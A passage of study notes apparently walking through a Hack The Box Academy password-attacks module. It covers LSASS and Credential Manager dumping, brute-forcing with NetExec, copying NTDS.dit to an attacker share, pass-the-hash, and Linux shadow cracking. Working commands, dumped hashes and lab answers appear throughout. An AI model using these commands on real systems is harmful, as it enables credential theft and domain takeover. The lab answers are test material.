		sha1_masterkey 6c3046d0bc927cdfd9b4503c6115034018dbddd1
	== DPAPI [3e7]==
		luid 999
		key_guid 76bb8676-5b2c-4f03-b81a-d013595af401
		masterkey ee1f242fb9f9a5cade04b7cc07ffd0fe5dd5d56a38e79963af87862a5c0ce6e8f0b033d0f7f41f0d8ea757cdd76413f9b8ad6b5d5715734bb9254c4d26ce0943
		sha1_masterkey ca67ee91ed3682d338bdf6b0c72990749c0cbc00
	== DPAPI [3e7]==
		luid 999
		key_guid 0c1b6c0a-191d-4839-8cf5-22ca4c3e5880
		masterkey dccd4056a5b0cc8211193669e6aea7755eeccd393adf0e5efa1f2a571c96039a7dbe05c9082c44f85b3080bb908eb41fb9f860174cd365e655f3d5788d5a8427
		sha1_masterkey efddd94b4348303e90c8d7285e8b65738196dc86
	== DPAPI [3e7]==
		luid 999
		key_guid 0453985c-7220-49f4-b024-79acf0de7874
		masterkey aaf3cdd36cf0d10871efd0d78a527664afc58078e84d49734f372fbb09e209538f606e0c5f0481b9f4d6ac6efb9a3631f16e38737a1b3cc15d0db42b63ebc90e
		sha1_masterkey 1d77f450edb6c76d14838b5b351672f35eec615f
	== DPAPI [3e7]==
		luid 999
		key_guid c19ecbf1-ea92-487e-a2d4-419f60a62360
		masterkey 387a060baf6887038b7ff133cd0eb4712ecdf531c16030a82395db368e6b2cda563dd026ccb815e1fb85215281a5437f085e3a5ca47fe9038e7e072f46270d74
		sha1_masterkey 5b07ca8e21e100937af4ab6d3f2482c745245436
	== DPAPI [3e7]==
		luid 999
		key_guid 6c61536b-7453-4ffa-911b-693858aef0c9
		masterkey 0c5f662bf8f65c75b773e4698606db1e2e387ad18a9c4fdee25e0dbac6eb7c04e04874d1910aba465ef3380a92b46231d7a781df2f5e38d2621e06c7476b222f
		sha1_masterkey cbabadd23d93b47ec94ac604ac91945135c5a097

== LogonSession ==
authentication_id 546341 (85625)
session_id 2
username htb-student
domainname FS01
logon_server FS01
logon_time 2026-07-01T20:36:05.238459+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1006
luid 546341
	== MSV ==
		Username: htb-student
		Domain: FS01
		LM: NA
		NT: 3c0e5d303ec84884ad5c3b7876a06ea6
		SHA1: b2978f9abc2f356e45cb66ec39510b1ccca08a0e
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [85625]==
		username htb-student
		domainname FS01
		password None
		password (hex)
	== Kerberos ==
		Username: htb-student
		Domain: FS01
	== WDIGEST [85625]==
		username htb-student
		domainname FS01
		password None
		password (hex)
	== DPAPI [85625]==
		luid 546341
		key_guid c75b5a96-7d80-4511-8bb8-474e3c09670f
		masterkey 12e8cc72d4d672d492fc8878c736aea970e11d74e87061fe779ce8884c9f0cb20cd0db541f95440ed8c4d527a91682fb7721ba397700932a49c8dbb7120cd2c8
		sha1_masterkey a34f57ba87672c43f091934906052ac4cf7364f7

== LogonSession ==
authentication_id 525359 (8042f)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2026-07-01T20:36:04.332204+00:00
sid S-1-5-90-0-2
luid 525359
	== WDIGEST [8042f]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [8042f]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 73559 (11f57)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-07-01T20:26:34.832213+00:00
sid S-1-5-90-0-1
luid 73559
	== WDIGEST [11f57]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [11f57]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username FS01$
domainname WORKGROUP
logon_server 
logon_time 2026-07-01T20:26:34.644705+00:00
sid S-1-5-20
luid 996
	== WDIGEST [3e4]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== Kerberos ==
		Username: fs01$
		Domain: WORKGROUP
	== WDIGEST [3e4]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 42780 (a71c)
session_id 0
username 
domainname 
logon_server 
logon_time 2026-07-01T20:26:34.207210+00:00
sid None
luid 42780

== LogonSession ==
authentication_id 127254 (1f116)
session_id 0
username Vendor
domainname FS01
logon_server FS01
logon_time 2026-07-01T20:26:37.179705+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1003
luid 127254
	== MSV ==
		Username: Vendor
		Domain: FS01
		LM: NA
		NT: 31f87811133bc6aaa75a536e77f64314
		SHA1: 2b1c560c35923a8936263770a047764d0422caba
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [1f116]==
		username Vendor
		domainname FS01
		password None
		password (hex)
	== Kerberos ==
		Username: Vendor
		Domain: FS01
	== WDIGEST [1f116]==
		username Vendor
		domainname FS01
		password None
		password (hex)

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2026-07-01T20:26:34.988455+00:00
sid S-1-5-19
luid 997
	== Kerberos ==
		Username: 
		Domain: 
```



We should see the `NT`:

```bash
hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt

31f87811133bc6aaa75a536e77f64314:Mic@123                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 31f87811133bc6aaa75a536e77f64314
Time.Started.....: Wed Jul  1 16:51:38 2026 (1 sec)
Time.Estimated...: Wed Jul  1 16:51:39 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3809.6 kH/s (0.54ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2113536/14344384 (14.73%)
Rejected.........: 0/2113536 (0.00%)
Restore.Point....: 2105344/14344384 (14.68%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: PECKER401 -> MOVEON
Hardware.Mon.#1..: Temp: 40c Util: 21%

Started: Wed Jul  1 16:51:35 2026
Stopped: Wed Jul  1 16:51:40 2026

```

The password is `Mic@123`.

# Attacking Windows Credential Manager



## What is Credential Manager?

Built into Windows since Server 2008 R2/ Windows 7. Stores encrypted credentials for websites, network resources, domain users, and services.
Two types:


| Type                    | Description                                           |
| ----------------------- | ----------------------------------------------------- |
| **Web Credentials**     | Websites/online accounts — used by IE and legacy Edge |
| **Windows Credentials** | Domain users, network shares, services, OneDrive      |


Stored in encrypted vault folders protected by DPAPI:

```cmd
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

Each vault contains a `Policy.vpol` file with AES-128/256 keys protected by DPAPI masterkeys.

### Enumerate Stored Credentials

```cmd
cmdkey /list
```



### Output fields:


| Field         | Meaning                                        |
| ------------- | ---------------------------------------------- |
| `Target`      | Resource the credential is for                 |
| `Type`        | `Generic` or `Domain Password`                 |
| `User`        | Associated username                            |
| `Persistence` | `Local machine persistence` = survives reboots |




## Impersonate a Stored User (runas)

If you find a `Domain:interactive` credential:

```cmd
runas /savecred /user:SRV01\mcharles cmd
# Opens a new cmd session as mcharles using stored creds
# No password prompt — credential is pulled from vault
```

Extract Credentials with Mimikatz

```cmd
mimikatz.exe
privilege::debug
sekurlsa::credman
```

Dumps credentials stored in Credential Manager from LSASS memory — reveals plaintext passwords for stored accounts including OneDrive, network shares, etc.

Other tools for the same purpose: SharpDPAPI, LaZagne, DonPAPI

### Export Vault (for offline analysis)

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

Opens GUI to export vault to `.crd` file (encrypted with user-supplied password).

## Key Takeaways

- Credential Manager is a high-value target - users often store domain, VPN, and cloud credentials here
- `cmdkey /list` is your first recon step - fast and built-in
- `runas /savecred` allows direct impersonation without knowing the password
- Mimikatz `sekurlsa::credman` extracts plaintext passwords from memory - requires admin + debug privilege
- DPAPI protects the vaults - Credential Guard (on modern Windows with VBS enabled) makes extraction harder



## Connect to HTB



#### What is the password mcharles uses for OneDrive?

```bash
xfreerdp /v:10.129.49.216 /u:sadams /p:'totally2brow2harmon@'
cmdkey /list
Currently stored credentials:

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles

runas /savecred /user:SRV01\mcharles cmd
```

```bash
wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe -O ~/LaZagne.exe

sudo $(which smbserver.py) -smb2support -username sadams -password 'totally2brow2harmon@' CompData /home/mapacheroja22/
```

```bash
net use \\10.10.17.216\CompData /user:sadams totally2brow2harmon@
copy \\10.10.17.216\CompData\mimikatz.exe C:\Users\sadams\mimikatz.exe
C:\Users\sadams\mimikatz.exe

net use \\10.10.17.216\CompData /user:sadams totally2brow2harmon@
copy \\10.10.17.216\CompData\LaZagne.exe C:\Users\sadams\LaZagne.exe

# On mcharles
C:\Users\sadams\LaZagne.exe all


########## User: mcharles ##########

------------------- Credman passwords -----------------

[+] Password found !!!
URL: onedrive.live.com
Login: mcharles@inlanefreight.local
Password: Inlanefreight#2025


[+] 1 passwords have been found.
For more information launch it again with the -v option

elapsed time = 1.2188763618469238
```



# Attacking Active Directory and NTDS.dit



## Overview

When a Windows system joins a domain, authenticaiton shifts from the local SAM database to the Domain Controller (DC). The DC validates credentials against Active Directory, stored in `NTDS.dit`. Compromising this files means compromising every domain account.

### Step 1 - Build a Username List

Common naming conventions:


| Convention             | Example (Jane Doe) |
| ---------------------- | ------------------ |
| `firstinitiallastname` | `jdoe`             |
| `firstname.lastname`   | `jane.doe`         |
| `firstnamelastname`    | `janedoe`          |
| `lastname.firstname`   | `doe.jane`         |


Use Username Anarchy to auto-generate all variants:

```bash
./username-anarchy -i /home/ltnbob/names.txt
```



### Step 2 - Validate Usernames with Kerbrute

```bash
sudo apt install golang -y
go version
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
make linux
cd dist/
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
# [+] VALID USERNAME: bwilliamson@inlanefreight.local
```



### Step 3 - Brute-Force AD Credentials with NetExec

```bash
nxc smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
# [+] inlanefrieght.local\bwilliamson:P@55w0rd!
```

> Noisy attack - generates lots of logs (Event ID 4776). No lockout policy by default in Windows domains, but check before spraying.



### Step 4 - Connect to DC with Evil-WinRM

```bash
evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

Check privileges

```bash
net localgroup
net user bwilliamson
# Look for Domain Admins membership
```



### Step 5 - Capture NTDS.dit



#### Manual method (VSS)

```bash
# Create shadow copy
vssadmin CREATE SHADOW /For=C:

# Copy NTDS.dit from shadow copy
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

# Transfer to attack host
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```



#### Fast method (NetExec one-liner)

```bash
nxc smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
# Dumps all hashes directly to /home/user/.nxc/logs/
```



### Step 6 - Extract Hashes with secretsdump

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
# Output: username:RID:lmhash:nthash:::
```

> Like SAM, NTDS.dir hashes are encrypted with the SYSTEM boot key - need both files.



### Step 7 - Crack or Use Hashes



#### Crack NT hash

```bash
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```



#### Pass-the-Hash (if cracking fails)

```bash
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```



## Full Atack Chain

```bash
OSINT → employee names
        ↓
Username Anarchy → username list
        ↓
Kerbrute → validate usernames
        ↓
NetExec SMB brute-force → get credentials
        ↓
Evil-WinRM → connect to DC
        ↓
vssadmin / nxc ntdsutil → capture NTDS.dit
        ↓
secretsdump → extract all domain hashes
        ↓
hashcat -m 1000 → crack NT hashes
PtH with evil-winrm → if cracking fails
```



## Connect to HTB



#### What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.***)

`NTDS.dit`

#### Submit the NT hash associated with the Administrator user from the example output in the section reading.

`64f12cddaa88057e06a81b54e73b949b`

#### On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)

```bash
nano employees.txt
John Marston
Carol Johnson
Jennifer Stapleton

./username-anarchy -i employees.txt > employees-acounts.txt

nxc smb 10.129.50.27
SMB         10.129.50.27    445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False) (Null Auth:True)

cd ../kerbrute/dist
./kerbrute_linux_amd64 userenum --dc 10.129.50.27 --domain ILF.local ../../username-anarchy/employees-acounts.txt
2026/07/01 22:21:31 >  [+] VALID USERNAME:	 jmarston@ILF.local
2026/07/01 22:21:33 >  [+] VALID USERNAME:	 cjohnson@ILF.local
2026/07/01 22:21:33 >  [+] VALID USERNAME:	 jstapleton@ILF.local

nxc smb 10.129.50.27 -u jmarston -p /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt --domain ILF.local

cat > ilf_wordlist.txt << 'EOF'
Inlanefreight
inlanefreight
ILF
ilf
Marston
marston
John
john
Director
director
IT
Password1
Password123
Welcome1
Welcome123
EOF

hashcat --force ilf_wordlist.txt -r /usr/share/hashcat/rules/best64.rule --stdout | sort -u > ilf_mut.txt

cat ilf_mut.txt /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt > combined.txt

nxc smb 10.129.50.27 -u jmarston -p ../combined.txt --domain ILF.local

nxc smb 10.129.50.27 -u jmarston -p /usr/share/wordlists/rockyou.txt --domain ILF.local --ignore-pw-decoding

nxc smb 10.129.50.27 -u jmarston -p ~/usr/share/wordlists/fasttrack.txt --domain ILF.local
SMB         10.129.50.27    445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)

nxc smb 10.129.50.27 -u jmarston -p 'P@ssword!' -M ntdsutil
SMB         10.129.50.27    445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.50.27    445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
NTDSUTIL    10.129.50.27    445    ILF-DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\178296091
NTDSUTIL    10.129.50.27    445    ILF-DC01         Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.50.27    445    ILF-DC01         [+] NTDS.dit dumped to C:\Windows\Temp\178296091
NTDSUTIL    10.129.50.27    445    ILF-DC01         [*] Copying NTDS dump to /tmp/tmpkh7jw2_r
NTDSUTIL    10.129.50.27    445    ILF-DC01         [*] NTDS dump copied to /tmp/tmpkh7jw2_r
NTDSUTIL    10.129.50.27    445    ILF-DC01         [+] Deleted C:\Windows\Temp\178296091 remote dump directory
NTDSUTIL    10.129.50.27    445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.50.27    445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:920c2162933725868e4fa446e65ceb6f:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
NTDSUTIL    10.129.50.27    445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/mapacheroja22/.nxc/logs/ntds/ILF-DC01_10.129.50.27_2026-07-01_225459.ntds of which 7 were added to the database
NTDSUTIL    10.129.50.27    445    ILF-DC01         [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    10.129.50.27    445    ILF-DC01         [*] grep -iv disabled /home/mapacheroja22/.nxc/logs/ntds/ILF-DC01_10.129.50.27_2026-07-01_225459.ntds | cut -d ':' -f1

nano jhash.txt
92fd67fd2f49d0e83744aa82363f021b

hashcat -m 1000 jhash.txt /usr/share/wordlists/rockyou.txt
92fd67fd2f49d0e83744aa82363f021b:Winter2008               
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 92fd67fd2f49d0e83744aa82363f021b
Time.Started.....: Wed Jul  1 23:00:54 2026 (1 sec)
Time.Estimated...: Wed Jul  1 23:00:55 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7011.8 kH/s (0.32ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2088960/14344384 (14.56%)
Rejected.........: 0/2088960 (0.00%)
Restore.Point....: 2080768/14344384 (14.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Zlatan -> TEAMODARIO
Hardware.Mon.#1..: Temp: 40c Util: 22%
Started: Wed Jul  1 23:00:53 2026
Stopped: Wed Jul  1 23:00:56 2026

Winter2008

```



#### Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)

```bash
Winter2008
```



# Credential Hunting in Windows

Searching a compromised system's files and applications for stored credentials after gaining access (e.g., via RDP to an IT admin workstation).

The core idea from this is to base your search on how the system is used. Knowing you're on an IT admin's box helps you predict where credentials live, reducing random guessing. 

Some key terms to search for are:

```bash
password
passphrase
key
username
creds
pwd
login
credentials
dbpassword
configuration
```



## Search tools

- Windows Search (GUI): Searches OS settings and filesystem for keyword matches.
- LaZagne: Third-party tool with modules that extract stored/insecurely-saved passwords from browsers, chat apps, mail clients, memory (KeePass/LSASS), sysadmin tools (OpenVPN/WinSCP), Windows secrets, and WiFi. Run `start Lazagne.exe all` (add `-vv` for verbose). Transfer via xfreerdp copy-paste.
- findstr (CLI): Pattern search across file types:

```bash
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```



## High-value locations to check

- Group Policy / scripts in the SYSVOL share
- `web.config` on dev/IT machines and shares
- `unattend.xml`
- AD user/computer description fields
- KeePass databases (if master password is crackable)
- Files named `pass.txt`, `passwords.docx/xlsx` on user systems, shares, SharePoint



## Takeaway

Many apps store credentials in cleartext or with weak/reversible encryption, making post-exploitation credential hunting fast and high-yield. Tailor your approach to the host's role (Server vs Desktop).

## Connect to HTB



#### What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)

```bash
xfreerdp /v:10.129.202.99 /u:Bob /p:HTB_@cademy_stdnt!

WellConnected123
```



#### What is the GitLab access code Bob uses? (Format: Case-Sensitive)

```bash
3z1ePfGbjWPsTfCsZfjy
```



#### What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)

```bash
wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe

sudo $(which smbserver.py) -smb2support -username Bob -password 'HTB_@cademy_stdnt!' CompData /home/mapacheroja22/
```

```powershell
copy \\10.10.17.216\CompData\LaZagne.exe C:\Users\bob\Desktop\
```

```cmd
start LaZagne.exe all

ubuntu
FSadmin123
```



#### What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)

```bash
Inlanefreightisgreat2022
```



#### What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)

```bash
edgeadmin:Edge@dmin123!
```



# Linux Authentication Process



## PAM (Pluggable Authentication Modules)

Linux commonly uses PAM for authentication. Modules like `pam_unix.so` (found in `/usr/lib/x86_64-linux-gnu/security/` on Debian) handle user info, authentication, sessions, and password changes. When you run `passwd`, PAM is invoked. It reads from and writes to `/etc/passwd` and `/etc/shadow`, and also supports LDAP, Kerberos, and mount modules.

## Passwd file

`/etc/passwd` lists every user and is world-readable. Each entry has 7 colon-separated fields:

```bash
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

Fields:
Username, password, UID, GID, GECOS, Home directory, Default shell.

The Password field matters most:

- `x` -> hash is stored in `/etc/shadow` (normal case).
- An actual hash -> rare, old systems; crackable since the file is world-readable.
- Empty -> no password required. If `/etc/passwd` is mistakenly writeable, an attacker can blank out root's password field:

```bash
head -n 1 /etc/passwd
root::0:0:root:/root:/bin/bash
```

Then log in with no prompt:

```bash
su
```

Watch for misassigned write permissions on `/etc` from inexperienced admins.

## Shadow file

`/etc/shadow` was introduced to protect hashes, it's only readable by root. Same style as oasswd but with 9 fields:

```bash
htb-student:$y$j9T$3QSBB6CbHEu...f8Ms:18955:0:99999:7:::
```

Fields:
Username, password, Last change, Min age, Max age, Warning period, Inactivity period, Expiration date, Reserved.

- `!` or `*` in the Password field -> no Unix password login (but Kerberos/key auth may still work).
- Empty Password field -> no password needed.

Hash format: `$<id>$<salt>$<hashed>`. The ID identifies the algorithm:


| ID   | Algorithm     |
| ---- | ------------- |
| 1    | MD5           |
| 2a   | Blowfish      |
| 5    | SHA-256       |
| 6    | SHA-512       |
| sha1 | SHA1crypt     |
| y    | Yescrypt      |
| gy   | Gost-yescrypt |
| 7    | Scrypt        |


Modern Debian defaults to yescrypt; older systems may use waker, more crackable algorithms.

## Opasswd
PAM (`pam_unix.so`) blocks password reuse by storing old passwords in `/etc/security/opasswd` (root-only read):
```bash
sudo cat /etc/security/opasswd
```

Multiple old hashes per user are comma-separated. Note the hash type - MD5 (`$1$`) is far easier to crack than SHA-512. Old passwords reveal reuse patterns, improving your chances of guessing current credentials.

## Cracking Linux Credentials
With root access, gather hashes and crack them. `unshadow` (bundled with John the Ripper) merges passwd + shadow into one crackable file:

```bash
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

Then crack with hashcat (mode `1800` = SHA-512crypt):
```bash
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

> Note: This scenario is exactly what JtR's single crack mode was designed for.

## Key takeaways
`passwd` is world-readable (crackable if hashes leak there), `shadow` is root-only, the `$id$` prefix tells you the algorithm (and how crackable it is), and `opasswd` is a goldmine for spotting password-reuse patterns.

## Connect to HTB
#### Download the attached ZIP file (linux-authentication-process.zip), and use single crack mode to find martin's password. What is it?

```bash
cd Desktop

sudo cp passwd /tmp/passwd.bak
sudo cp shadow /tmp/shadow.bak

cd john/run/
./unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

cat unshadowed.hashes

root:!:0:0:root:/root:/usr/bin/zsh
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/usr/sbin/nologin
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:*:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:*:42:65534::/nonexistent:/usr/sbin/nologin
nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:!*:998:998:systemd Network Management:/:/usr/sbin/nologin
_galera:!:100:65534::/nonexistent:/usr/sbin/nologin
mysql:!:101:102:MariaDB Server,,,:/nonexistent:/bin/false
tss:!:102:103:TPM software stack,,,:/var/lib/tpm:/bin/false
strongswan:!:103:65534::/var/lib/strongswan:/usr/sbin/nologin
systemd-timesync:!*:992:992:systemd Time Synchronization:/:/usr/sbin/nologin
rwhod:!:104:65534::/var/spool/rwho:/usr/sbin/nologin
_gophish:!:105:105::/var/lib/gophish:/usr/sbin/nologin
iodine:!:106:65534::/run/iodine:/usr/sbin/nologin
messagebus:!:107:106::/nonexistent:/usr/sbin/nologin
tcpdump:!:108:107::/nonexistent:/usr/sbin/nologin
miredo:!:109:65534::/var/run/miredo:/usr/sbin/nologin
_rpc:!:110:65534::/run/rpcbind:/usr/sbin/nologin
Debian-snmp:!:111:109::/var/lib/snmp:/bin/false
redis:!:112:111::/var/lib/redis:/usr/sbin/nologin
usbmux:!:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mosquitto:!:114:114::/var/lib/mosquitto:/usr/sbin/nologin
redsocks:!:115:115::/var/run/redsocks:/usr/sbin/nologin
stunnel4:!*:991:991:stunnel service system account:/var/run/stunnel4:/usr/sbin/nologin
sshd:!:116:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:!:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
sslh:!:117:118::/nonexistent:/usr/sbin/nologin
postgres:!:118:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
avahi:!:119:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
_gvm:!:120:122::/var/lib/openvas:/usr/sbin/nologin
speech-dispatcher:!:121:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
inetsim:!:122:124::/var/lib/inetsim:/usr/sbin/nologin
geoclue:!:123:125::/var/lib/geoclue:/usr/sbin/nologin
lightdm:!:124:126:Light Display Manager:/var/lib/lightdm:/bin/false
statd:!:125:65534::/var/lib/nfs:/usr/sbin/nologin
saned:!:126:128::/var/lib/saned:/usr/sbin/nologin
polkitd:!*:989:989:User for polkitd:/:/usr/sbin/nologin
rtkit:!:127:129:RealtimeKit,,,:/proc:/usr/sbin/nologin
colord:!:128:130:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
nm-openvpn:!:129:131:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
nm-openconnect:!:130:132:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin
martin:$6$0XiU8Oe/pGpxWvdq$n6TgiYUVAXBUOO11C155Ea8nNpSVtFFVQveY6yExlOdPu99hY4V9Chi1KEy/lAluVFuVcvi8QCO1mCG6ra70A1:1000:1000:Martin Mendes:/home/martin:/usr/bin/zsh
cups-pk-helper:!:131:135:user for cups-pk-helper service,,,:/nonexistent:/usr/sbin/nologin
sarah:$6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:1001:1001:Sarah Saragaday:/home/sarah:/usr/bin/bash

hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/wordlists/rockyou.txt -o /tmp/unshadowed.cracked

cat /tmp/unshadowed.cracked
$6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:mariposa
$6$0XiU8Oe/pGpxWvdq$n6TgiYUVAXBUOO11C155Ea8nNpSVtFFVQveY6yExlOdPu99hY4V9Chi1KEy/lAluVFuVcvi8QCO1mCG6ra70A1:Martin1

Martin1
```

#### Use a wordlist attack to find sarah's password. What is it?
```bash
mariposa
```